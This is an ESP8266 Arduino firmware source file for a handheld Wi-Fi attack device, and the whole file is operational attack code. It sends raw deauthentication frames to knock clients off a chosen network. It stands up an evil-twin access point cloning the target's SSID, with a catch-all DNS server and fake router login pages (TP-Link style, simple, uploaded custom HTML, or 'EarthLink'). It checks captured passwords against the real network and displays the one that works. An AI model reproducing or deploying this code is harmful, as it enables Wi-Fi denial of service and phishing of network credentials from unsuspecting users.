//done:  2024-9-21-8:39 مساء
//update add customHTML and EarthLink 2024-10-28
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "images_pages.h"

const int buttonSelect = 14;
const int buttonLeft = 13;
const int buttonRight = 0;
int attackType = 2;
int pageDesign = 2;
int networkPosition = 0;
int networksNumber = 0;
bool selectPage = false;
bool targetSelected = false;
bool hotspot_active = false;
bool deauthing_active = false;
bool isScaned = false;
bool catchMessage = true;
bool attackMessage = true;
bool attackDone = false;
bool attackSelected = false;
bool canReturn = true;
bool pageSelected = false;
bool networkCopied = false;
bool isFileUpload = false;
bool canReturn2 = true;
bool canReturn3 = true;
bool canReturn4 = true;
bool booted = false;
String customPageHtml = "v ";
String _correct = "";
String _tryPassword = "";

int buttonSelectState = digitalRead(buttonSelect);
int buttonLeftState = digitalRead(buttonLeft);
int buttonRightState = digitalRead(buttonRight);

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SCREEN_ADDRESS 0x3C
#define SUBTITLE "Validation Panel"
#define TITLE "Sign in:"
#define BODY ""
#define POST_TITLE ""
#define POST_BODY ""

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
  


String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}



void handleResult() {
  String html = "";
  if (WiFi.status() == WL_CONNECTED) {
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("n", "Eviltwin");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    deauthing_active = false;
    attackDone = true;
    _correct = _tryPassword;
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.println("Password Catched:");
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 20);
    display.println(_correct);
    display.display();
    display.clearDisplay();
  } else {
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.println("Wrong password:");
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 20);
    display.println(_tryPassword);
    display.display();
    display.clearDisplay();
    canReturn3 = true;
  }
}


String posted() {
  return header(POST_TITLE) + POST_BODY + "<script> setTimeout(function(){window.location.href = '/';}, 15000); </script>" + footer();
}


void handleIndex() {
  if (hotspot_active == true){
      if(pageDesign == 3){
        webServer.send(200, "text/html", simple());
      }else if (pageDesign == 2) {
        webServer.send(200, "text/html", tpLink());
      }else if (!isFileUpload){
          webServer.send(200, "text/html", customPageHtml);
      }



    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", posted());
    }
      }else if(isFileUpload){
    webServer.send(200, "text/html" , htmlPageUpload());
        }
}



void createAP(){
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  if(isFileUpload == true){
    WiFi.softAP("server AP","kizohi00");
  }else{
    if(attackType == 4){
    if(isFileUpload == 0){
      WiFi.softAP("EarthLink");
    }
  }else if (attackType == 1){
    WiFi.softAP(_selectedNetwork.ssid.c_str(), "", _selectedNetwork.ch);
    WiFi.softAPmacAddress(_selectedNetwork.bssid);
    } else {
    networkCopied = true;
    WiFi.softAP(_selectedNetwork.ssid.c_str(),"");
  }
}
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  handleIndex();
}


void addButton(){
if  (canReturn4){
  canReturn4 = false;
  int buttonIndex = customPageHtml.indexOf("<button");
    if(buttonIndex != -1){
      String beforeButton = customPageHtml.substring(0, buttonIndex + 7);
      String afterButton = customPageHtml.substring(buttonIndex + 7);
      customPageHtml = beforeButton +
                        " onclick=\"window.location.href='/?password=' + encodeURIComponent(document.getElementById('passwordInput').value);\"" + 
                        afterButton;
}


    int inputIndex = customPageHtml.indexOf("<input");
    if(buttonIndex != -1){
      String beforeInput = customPageHtml.substring(0, inputIndex + 6);
      String afterInput = customPageHtml.substring(inputIndex + 6);
      customPageHtml = beforeInput +
                        " id=\"passwordInput\"" + 
                        afterInput;
    }
  }

    if(attackType != 1){
      hotspot_active = true;
    }
    if(attackType == 2){
      deauthing_active = true;
    }
    isFileUpload = false;
    display.setTextSize(2);
    display.setTextColor(WHITE);
    display.setCursor(0, 20);
    display.println("Attacking");
    display.display();
    display.clearDisplay();
    attackMessage = false;

    if(attackType == 1){
      attackMessage = true;
      display.setTextSize(2);
      display.setTextColor(WHITE);
      display.setCursor(0, 20);
      display.println("Waiting...");
      display.display();
      display.clearDisplay();
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      performScan();
    }else{
      createAP();
    }
}


void handleFileUpload() {
 HTTPUpload& upload = webServer.upload();

  
  if (upload.status == 0) {
    customPageHtml = "";
  } else if (upload.status == 1) {
    customPageHtml += String((char*)upload.buf).substring(0, upload.currentSize);
  } else if (upload.status == 3) {

  }

  if(customPageHtml != ""){
    addButton();
  }
}



bool isNetworkAvailable() {
  bool networkAvailable = false;
  int networksFound = WiFi.scanNetworks();
  for (int i = 0; i < networksFound; i++) {
    if(WiFi.SSID(i) == _selectedNetwork.ssid){
      networkAvailable = true;
      break;
    }else{
      networkAvailable = false;
    }
  }
  
  return networkAvailable;
}


void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}



String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' >" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}

void performScan() {
  networksNumber = 0;
  networkPosition = 0;
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 32; ++i) {
      networksNumber++;
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      networkPosition = 0;
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
    _Network network;
    network.ssid = "Re-scan";
    network.bssid[0] = ""[0];
    network.ch = 1;
    _networks[networksNumber] = network;  
    isScaned = true;
  if (attackType == 1){
    if(isNetworkAvailable()){
      delay(2500);
      performScan();
    }else{
      canReturn = false;
      hotspot_active = true;
      createAP();
      if(attackMessage){
      display.setTextSize(2);
      display.setCursor(0,10);
      display.println("Attacking");
      display.display();
      display.clearDisplay();
      attackMessage = false;
      }
    }
  }else if(booted){
    display.setTextSize(2);
    display.setTextColor(WHITE);
    display.setCursor(20, 20);
    display.println(_networks[0].ssid);
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println("Select Network:");
    display.display();
    display.clearDisplay();
  }
}







void attackTypeDisplay(){
              if (attackType == 1) {
              display.drawBitmap(0, 0, Handler_icon, 128, 64, WHITE);
            } else if (attackType == 2) {
                display.drawBitmap(0, 0, EvilTwin_icon, 128, 64, WHITE);
              } else if (attackType == 3) {
                display.drawBitmap(0, 0, Deauth_icon, 128, 64, WHITE);
                }else{
                  display.drawBitmap(0, 0, earthlink_icon, 128, 64, WHITE);
                }
            display.display();
            display.clearDisplay();
}

void startAttack2(){
  pageSelected = true;
              attackSelected = true;
              hotspot_active = true;
              deauthing_active = true;
              createAP();
}

void startAttack1(){
              attackSelected = true;
              display.setTextSize(2);
              display.setTextColor(WHITE);
              display.setCursor(0, 20);
              display.println("Waiting...");
              display.display();
              display.clearDisplay();
              performScan();
}

void startAttack4(){
              attackSelected = true;
              hotspot_active = true;
              handleIndex();
              if(attackMessage){
              display.setTextSize(2);
              display.setTextColor(WHITE);
              display.setCursor(0, 20);
              display.println("EarthLink");
              display.display();
              display.clearDisplay();
              attackMessage = false;
              }
}

void pageSelectProcess(){
  int buttonSelectState = digitalRead(buttonSelect);
  int buttonLeftState = digitalRead(buttonLeft);
  int buttonRightState = digitalRead(buttonRight);
            if (buttonRightState == LOW) {
            if (pageDesign != 1) {
              pageDesign--;
            } else {
              pageDesign = 3;
            }
            delay(200);
          }

          if (buttonLeftState == LOW) {
            if (pageDesign != 3) {
              pageDesign++;
            } else {
              pageDesign = 1;
            }
            delay(200);
          }
          if(!hotspot_active){
          if (pageDesign == 1) {
              display.drawBitmap(0, 0, Custom_icon, 128, 64, WHITE);
            } else {
              if (pageDesign == 2) {
                display.drawBitmap(0, 0, TpLink_icon, 128, 64, WHITE);
              } else {
                display.drawBitmap(0, 0, Simple_icon, 128, 64, WHITE);
              }
            }
          }
            if(canReturn){
              display.display();
              display.clearDisplay();
            }
}



void selectNetwork(){
  int buttonSelectState = digitalRead(buttonSelect);
  int buttonLeftState = digitalRead(buttonLeft);
  int buttonRightState = digitalRead(buttonRight);
  if (buttonSelectState == LOW) {
          if(networkPosition != networksNumber){
            _selectedNetwork = _networks[networkPosition];
            targetSelected = true;
          }else{
            isScaned = false;
            display.drawBitmap(0, 0, scanning, 128, 64, WHITE);
            display.display();
            display.clearDisplay();
            performScan();
          }
          delay(250);
        }

        if (buttonLeftState == LOW) {
          if (networkPosition != 0) {
            networkPosition--;
          } else {
            networkPosition = networksNumber;
          }
          display.setTextSize(2);
          display.setTextColor(WHITE);
          display.setCursor(20, 20);
          display.println(_networks[networkPosition].ssid);
          display.setTextSize(1);
          display.setCursor(0, 0);
          if(networkPosition == networksNumber){
            display.println("Click to re-scan");
          }else{
            display.println("Select Network:");
          }
          display.display();
          display.clearDisplay();
          delay(200);
        }

        if (buttonRightState == LOW) {
          if (networkPosition != networksNumber) {
            networkPosition++;
          } else {
            networkPosition = 0;
          }
          display.setTextSize(2);
          display.setTextColor(WHITE);
          display.setCursor(20, 20);
          display.println(_networks[networkPosition].ssid);
          display.setTextSize(1);
          display.setCursor(0, 0);
          if(networkPosition == networksNumber){
            display.println("Click to re-scan");
          }else{
            display.println("Select Network:");
          }
          display.display();
          display.clearDisplay();
          delay(200);
        }
}

void selectAttack(){
  int buttonSelectState = digitalRead(buttonSelect);
  int buttonLeftState = digitalRead(buttonLeft);
  int buttonRightState = digitalRead(buttonRight);
            if (buttonSelectState == LOW) {
              
            if (attackType == 3) {
              if(deauthing_active){
                attackSelected = false;
                deauthing_active = false;
              }else{
                attackSelected = false;
                deauthing_active = true;
              }
              delay(250);
            } else if (attackType == 2) {
                selectPage = true;
                pageSelected = false;
                attackSelected = true;
                delay(500);
              } else if (attackType == 1) {
                  pageSelected = false;
                  selectPage = true;
                  attackSelected = true;
                  delay(500);
                }else if(attackType == 4){
                  pageSelected = false;
                  selectPage = true;
                  attackSelected = true;
                  delay(500);
                }
                
            }
          if (buttonLeftState == LOW) {
            if (attackType != 1) {
              attackType--;
            } else {
              attackType = 4;
            }
            delay(200);
          }

          if (buttonRightState == LOW) {
            if (attackType != 4) {
              attackType++;
            } else {
              attackType = 1;
            }
            delay(200);
          }
}



void setup() {

  
  Serial.begin(9600);
  pinMode(2, OUTPUT);
 

  webServer.on("/", HTTP_GET, handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.on("/upload", HTTP_POST, []() {
  webServer.send(200, "text/plain", "File uploaded");
  }, handleFileUpload);
  
  webServer.begin();



  pinMode(buttonSelect, INPUT_PULLUP);
  pinMode(buttonLeft, INPUT_PULLUP);
  pinMode(buttonRight, INPUT_PULLUP);
  if (!display.begin(0x3C)) {
    Serial.println("SH1106 not found!");
    while (true);
  }

  
  display.clearDisplay();
  display.drawBitmap(0, 0, kizohiLogo, 128, 64, WHITE);
  display.display();
  display.clearDisplay();
  performScan();
  display.drawBitmap(0, 0, nethunter_icon, 128, 64, WHITE);
  display.display();
  display.clearDisplay();
  delay(1000);
  display.setTextSize(2);
  display.setTextColor(WHITE);
  display.setCursor(20, 20);
  display.println(_networks[0].ssid);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Select Network:");
  display.display();
  display.clearDisplay();
  booted = true;
}


String _tempHTML = "";

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }
}


unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  const int buttonSelect = 14;
const int buttonLeft = 2;
const int buttonRight = 0;
  dnsServer.processNextRequest();
  webServer.handleClient();

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", posted());
      delay(3000);
      handleResult();
      canReturn3 = false;


      
    }



  if (deauthing_active && millis() - deauth_now >= 500) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00 };

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  if(isFileUpload == true){
      display.setTextSize(2);
      display.setTextColor(WHITE);
      display.setCursor(0, 0);
      display.println("html upload");
      display.display();
      display.clearDisplay();
  }
    if((attackType == 2)&&(pageSelected) && (isFileUpload == false)){
      if(attackMessage){
      display.setTextSize(2);
      display.setTextColor(WHITE);
      display.setCursor(0, 20);
      if(isFileUpload == true){
      display.println("html upload");
      }else{
        display.println("EvilTwin");
      }
      display.display();
      display.clearDisplay();
      attackMessage = false;
    }
    }
    if((attackType == 4)&&(pageSelected)){
      if(attackMessage){
      display.setTextSize(2);
      display.setTextColor(WHITE);
      display.setCursor(0, 20);
      display.println("EarthLink");
      display.display();
      display.clearDisplay();
      attackMessage = false;
    }
    }
  }
  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {

    } else {
    }
    wifinow = millis();
  }



  networksNumber = 0;
  for (int i = 0; i < 16; i++) {
    if (_networks[networksNumber].ssid == "") {
      break;
    } else {
      networksNumber++;
    }
  }
  networksNumber--;

  if (isScaned) {
    if(!targetSelected){
      selectNetwork();
    }


    if ((!attackSelected) && (targetSelected)) {
      selectAttack();
      attackTypeDisplay();
    }


    if(selectPage){
      pageSelectProcess();
      if ((digitalRead(buttonSelect) == LOW) && (pageSelected == false)) {
        selectPage = false;
        if (pageDesign == 1){
          display.setTextSize(2);
          display.setTextColor(WHITE);
          display.setCursor(0, 20);
          display.println("html up");
          display.display();
          display.clearDisplay();
          isFileUpload = true;
        }else{
          pageSelected = true;
        }
        IPAddress IP = WiFi.softAPIP();
        createAP();
      }
    }


    if ((pageSelected) && (canReturn2 == 1)){
      canReturn2 = false;
      if(attackType == 2){
        startAttack2();
      }else if(attackType == 1){
        startAttack1();
          }else if (attackType == 4){
            hotspot_active = true;
            attackSelected = true;
            startAttack4();
          }
    }
  }
if((!attackMessage) && (digitalRead(buttonSelect) == LOW)){
  delay(250);
  if(attackType != 1){
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    selectPage = false;
    targetSelected = true;
    hotspot_active = false;
    deauthing_active = false;
    isScaned = true;
    catchMessage = true;
    attackMessage = true;
    attackDone = false;
    attackSelected = false;
    pageSelected = false;
    networkCopied = false;
    isFileUpload = false;
    canReturn = true;
    canReturn2 = true;
    canReturn3 = true;
    canReturn4 = true;
    selectAttack();
    attackTypeDisplay();
  }else{
    ESP.restart();
  }
}

  if(deauthing_active){
    digitalWrite(2, LOW);
  }else{
    digitalWrite(2, HIGH);
  }
}
